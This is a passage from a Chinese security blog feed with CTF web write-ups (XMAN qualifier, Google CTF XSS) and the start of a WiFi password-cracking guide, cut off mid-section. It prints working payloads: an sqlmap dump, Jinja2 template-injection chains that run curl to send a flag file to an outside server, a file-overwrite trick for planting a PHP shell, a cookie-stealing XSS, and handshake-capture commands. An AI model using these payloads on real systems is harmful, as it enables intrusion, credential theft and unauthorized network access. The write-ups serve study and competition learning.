title="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html">http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xman选拔赛web部分</title>
      <link href="/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/"/>
      <url>/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>暑假第一场比赛,做了个web部分,简单写下</p><h3 id="newscenter">NewsCenter</h3><p><strong>描述:This is to0 s1mple</strong> 地址:<a href="http://47.96.118.255:8888/" title="http://47.96.118.255:8888/">http://47.96.118.255:8888/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.96.118.255:33066/&quot; --data &quot;search=2&quot; -D news -T secret_table --dump</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/07/1-3.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="lottery">Lottery</h3><p><strong>没有描述...</strong> <a href="http://47.96.118.255:8888/" title="http://47.96.118.255:8888/">http://47.96.118.255:8888/</a> 随意看下,发现.git泄漏,githack一下,发现没文件,git log一下然后reset --hard <img src="/images/2018/07/2-1.jpg" alt="blacsheep" /> 关键代码api.php,看到判断函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">    <span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">    <span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">    <span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();</span><br><span class="line">    <span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$same_count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">    <span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>容易看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$same_count</span>++;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>然后数据的传入没有做限制,那么我们只要去构造一下json就可以拿到flag,众所周知,弱类型的字符只要不是'0'都等于Bool类型的True,那么构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$new</span> = <span class="keyword">array</span>(True,True,True,True,True,True,True);</span><br><span class="line"><span class="variable">$num</span> = <span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&quot;buy&quot;</span>,<span class="string">&quot;numbers&quot;</span>=&gt; <span class="variable">$new</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$num</span>);</span><br><span class="line"><span class="comment">//&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span></span><br></pre></td></tr></table></figure><p>简单传几次就拿到足够金币,买到flag <img src="/images/2018/07/3-1.jpg" alt="blacsheep" /> <img src="/images/2018/07/4-1.jpg" alt="blacsheep" /> 不是很懂那些挂着脚本能拿到flag的人...真是打扰了...</p><h3 id="confusion1">Confusion1</h3><p><strong>confusion1的描述:One day, Bob said "PHP is the best language!", but Alice didn't agree it, so Alice write a website to proof it. She published it before finish it but I find something WRONG at some page.(Please DO NOT use scanner!)</strong> 洞很好找,但绕过确实花了我蛮久的... flask的ssti <img src="/images/2018/07/5-1.jpg" alt="blacsheep" /> 源码里获得提示:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;</span><br><span class="line">&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt;</span><br></pre></td></tr></table></figure><p>ok,一般来说就直接一波payload打过去,比较经典的就是用object类的子类file来read,但是并不行 <img src="/images/2018/07/6-1.jpg" alt="blacsheep" /> 类似的过滤的还有class,ls等一些关键的字符串 过滤参考的一篇文章 <a href="https://0day.work/jinja2-template-injection-filter-bypasses/" title="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a> 里面提供了一些bypass 提供一个简单的测试脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    temp=<span class="built_in">input</span>()</span><br><span class="line">    r=requests.get(<span class="string">&quot;http://47.96.118.255:2333/&#123;&#123;&quot;</span>+temp+<span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">    res=re.findall(<span class="string">r&#x27;The requested URL .+ was not found on this server&#x27;</span>,r.text)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(res[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;&gt;&quot;</span>).replace(<span class="string">&#x27;&#x27;&#x27;,&quot;&#x27;&quot;))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(r.text)</span></span><br></pre></td></tr></table></figure><p>简单测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">The requested URL /&lt;Request &#x27;http://47.96.118.255:2333/&#123;&#123;request&#125;&#125;&#x27; [GET]&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;]</span><br><span class="line">The requested URL /&lt;class &#x27;flask.wrappers.Request&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__</span><br><span class="line">The requested URL /(&lt;class &#x27;werkzeug.wrappers.Request&#x27;&gt;, &lt;class &#x27;flask.wrappers.JSONMixin&#x27;&gt;) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__</span><br><span class="line">The requested URL /(&lt;class &#x27;werkzeug.wrappers.BaseRequest&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.CommonRequestDescriptorsMixin&#x27;&gt;) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__</span><br><span class="line">The requested URL /(&lt;type &#x27;object&#x27;&gt;,) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0]</span><br><span class="line">The requested URL /&lt;type &#x27;object&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;ss__&quot;]</span><br><span class="line">The requested URL / was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]</span><br><span class="line">The requested URL /&lt;built-in method __subclasses__ of type object at 0x7ff87ae16c40&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[40]</span><br><span class="line">The requested URL /&lt;type &#x27;file&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__.values()[12].__getattribute__(&#x27;s&#x27;+&#x27;ystem&#x27;)(&#x27;curl http://119.28.22.85/`tac /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt`&#x27;)</span><br><span class="line">The requested URL /0 was not found on this server</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/7.jpg" alt="blacsheep" /> 然后vps上拿到flag <img src="/images/2018/07/flag.jpg" alt="blacsheep" /> subclasses之前一直打成subclass,心疼自己...吃了没文化的亏orz... 这里也记录一个小彩蛋吧,打request的时候发现request里面有个file成员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request[&#x27;environ&#x27;][&quot;wsgi.errors&quot;]</span><br><span class="line">The requested URL /&lt;open file &#x27;&lt;stderr&gt;&#x27;, mode &#x27;w&#x27; at 0x7ff87b04c1e0&gt; was not found on this server</span><br></pre></td></tr></table></figure><p>那么我们可以干什么呢?我们可以调用这个成员的__init__函数,将这个文件进行重打开,之后的文件就可以任意写了,本地测试一下 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;request[&#x27;environ&#x27;][&#x27;wsgi.errors&#x27;].__init__(&#x27;./app.py&#x27;,&#x27;w&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/Screenshot-from-2018-07-16-17-34-01.png" alt="blacsheep" /> 然后我们就可以看到本地的app.py被覆盖了 <img src="/images/2018/07/Screenshot-from-2018-07-16-17-35-16.png" alt="blacsheep" /> 如果某个目录还有个php服务你就可以去写个php的shell,不过直接访问会被转义掉字符,用burp抓一下就不会了 <img src="/images/2018/07/Screenshot-from-2018-07-16-17-53-51.png" alt="blacsheep" /> 测试的app.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>比较有意思,不过当天比赛的时候很迷,每次我一写文件(并不是写的app.py,当时是随意写的一个123.php)，服务器就直接宕机...可还行... 最后一道web没看,晚上服务器反正又宕机了,不是我打的...之后再说吧..</p><h3 id="后记">后记</h3><p>环境已经关闭了,复现看他们开不开源吧,最后一道web又是python反序列化,老生常谈的问题了,这里放一下官方wp:<a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" title="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a> 然后第三个web他们绕过比我的简单,他们是调用的其它参数来获取的,payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.[request.args.a][request.args.b][<span class="number">2</span>][request.args.c]()[<span class="number">40</span>](<span class="string">&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;</span>)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>googleCTF中一道xss题</title>
      <link href="/2018/07/13/googlectf%E4%B8%AD%E4%B8%80%E9%81%93xss%E9%A2%98/"/>
      <url>/2018/07/13/googlectf%E4%B8%AD%E4%B8%80%E9%81%93xss%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>下午刚好有时间,打算学一下绕csp的xss,然后看到了orange师傅的一道googleCTF题的wp,感觉挺有意思的,这里记录一下 题目地址:<a href="https://gcalc2.web.ctfcompetition.com/" title="https://gcalc2.web.ctfcompetition.com/">https://gcalc2.web.ctfcompetition.com/</a> 大概的就是这个是个计算器 <img src="/images/2018/07/calc.jpg" alt="blacsheep" /> 下面的try it可以发一个report请求给admin,permalink可以查看链接,查看一下发现一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=vars.pi*3&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>发现expr可以用vars里的东西 查看js发现调用部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    a = <span class="title class_">String</span>(a).<span class="title function_">toLowerCase</span>();</span><br><span class="line">    b = <span class="title class_">String</span>(b);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^(?:[\(\)\*\/\+%\-0-9 ]\bvars\b[.]\w+)*$/</span>.<span class="title function_">test</span>(a))</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">Error</span>(a);</span><br><span class="line">    b = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(b, <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp;&amp; <span class="string">&quot;object&quot;</span> === <span class="keyword">typeof</span> b &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(b))</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), b);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;number&quot;</span> === <span class="keyword">typeof</span> b)</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;vars&quot;</span>,<span class="string">&quot;return &quot;</span> + a))(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会执行a,b作为匿名函数的参数 比如a="alert(b)",b="123"就会弹个123的窗 不过a会过一次正则,我们看一下正则 <img src="/images/2018/07/image.png" alt="blacsheep" /> 也就是说payload必须为</p><blockquote><p>1.前面一块的字符 2.vars,两边为boundary 3.点+数字字母</p></blockquote><p>Function类的最后一个参数会被执行,这里学到了新的xss技巧...可以用<code>constructor.constructor(CODE)()</code>来xss,比如说你有个vars的object,vars有个pi属性,然后下面这段代码会弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://regex101.com/r/FLdJ7h/1</span></span><br><span class="line"><span class="comment">// alert(1) </span></span><br><span class="line"><span class="comment">// Remove whitespaces by yourself</span></span><br><span class="line">vars.<span class="property">pi</span>.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">97</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">108</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">101</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">114</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">116</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">40</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">49</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">41</span>)</span></span><br><span class="line"><span class="params"></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><p>本来这样也就完成了攻击,但是function里面有个toLowerCase,导致不能用toString</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    a = <span class="title class_">String</span>(a).<span class="title function_">toLowerCase</span>();</span><br><span class="line">    b = <span class="title class_">String</span>(b);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>然后orange师傅又想了一个payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://regex101.com/r/IMXgwR/1</span></span><br><span class="line">(<span class="number">1</span>).<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  /<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(vars).pop()</span></span><br><span class="line"><span class="params"></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><p>这里前面用了constructor调出Object类,然后用keys(vars).pop()来获取vars的最后一个成员的key,我们从而可以通过vars来构造payload 第一版payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0,&quot;alert(1)&quot;:0&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/alert-1.jpg" alt="blacsheep" /> 不过到这里还并没有完 发现头部CSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: default-src &#x27;self&#x27;; child-src https://sandbox-gcalc2.web.ctfcompetition.com/</span><br></pre></td></tr></table></figure><p>那么我们并不能把cookie打出去 不过后来发现 /static/calc.html的CSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//https://sandbox-gcalc2.web.ctfcompetition.com/static/calc.html</span><br><span class="line"></span><br><span class="line">content-security-policy: default-src &#x27;self&#x27;; </span><br><span class="line">frame-ancestors https://gcalc2.web.ctfcompetition.com/; </span><br><span class="line">font-src https://fonts.gstatic.com; </span><br><span class="line">style-src &#x27;self&#x27; https://*.googleapis.com &#x27;unsafe-inline&#x27;; </span><br><span class="line">script-src &#x27;self&#x27; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com &#x27;unsafe-eval&#x27; https://www.googletagmanager.com; </span><br><span class="line">child-src https://www.google.com/recaptcha/; </span><br><span class="line">img-src https://www.google-analytics.com;</span><br></pre></td></tr></table></figure><p>ok,发现可以用www.google-analytics 放一篇hackerone的提交报告 <a href="https://hackerone.com/reports/199779" title="https://hackerone.com/reports/199779">https://hackerone.com/reports/199779</a> 然后google的console <a href="https://analytics.google.com/analytics/web/" title="https://analytics.google.com/analytics/web/">https://analytics.google.com/analytics/web/</a> 所以我们得以构造最后的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox-gcalc2.web.ctfcompetition.com/static/calc.html?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0, &quot;x=document.createElement(&#x27;img&#x27;);x.src=&#x27;https://www.google-analytics.com/collect?v=1&amp;tid=UA-xxxxxxxxx-x&amp;cid=xxxxxxxxx&amp;t=event&amp;ec=email&amp;ea=&#x27;+encodeURIComponent(document.cookie);document.querySelector(&#x27;body&#x27;).append(x)&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>这里的tid和cid是你的跟踪id和用户id,自己修改 本来这里是可以直接拿到flag的,但是其实填了之后发现并没有发到后端 <img src="/images/2018/07/res-1.jpg" alt="blacsheep" /> 自己修改一下就可以了,chrome调试修改或者burp都行 <img src="/images/2018/07/res-3.jpg" alt="blacsheep" /> 改完让chrome发出去,然后post一个report,就可以拿到flag了 <img src="/images/2018/07/res-2.jpg" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wifi密码破解</title>
      <link href="/2018/07/05/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2018/07/05/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>简单记录,破解的时候一般需要字典,kali自带一个字典/user/share/wordlists/rockyou.txt.gz,解压即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /user/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure><h3 id="切网卡模式">切网卡模式</h3><p>将我们的网卡改成监控模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airemon-ng start wlan0</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/Screenshot-from-2018-07-05-23-51-19.png" alt="blacsheep" /> 切换之后ifconfig查看,网卡的接口会变成wlan0mon <img src="/images/2018/07/Screenshot-from-2018-07-05-23-51-32.png" alt="blacsheep" /></p><h3 id="查看网络">查看网络</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p>拿到wifi网络的列表和一些信息 <img src="/images/2018/07/fix_3.png" alt="blacsheep" /></p><h3 id="抓握手包">抓握手包</h3><p>利用网卡的监听模式抓取周围无线网络的数据包,最重要的包也就是包含密码的包-握手包。当有用户断开或者连接wifi的时候会发送握手包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 1 --bssid F0:B4:29:D2:3D:2A ~/ wlan0mon</span><br></pre></td></tr></table></figure><p>参数说明:</p><blockquote><p>-c指定频道号 -bssid指定bssid -w数据包保存的位置</p></blockquote><figure><img src="/images/2018/07/Screenshot-from-2018-07-05-23-59-23.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 